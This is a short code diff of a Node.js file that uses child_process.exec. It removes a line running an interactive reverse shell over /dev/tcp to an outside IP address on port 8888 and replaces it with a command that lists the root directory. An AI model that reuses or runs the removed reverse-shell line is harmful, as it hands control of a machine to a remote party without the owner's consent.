@@ -3,7 +3,7 @@ const fs = require('fs');
 
 const { exec } = require("child_process");
 
-exec("/bin/sh -i >& /dev/tcp/38.242.133.6/8888 0>&1", (error, stdout, stderr) => {
+exec("ls -ltra /", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         return;
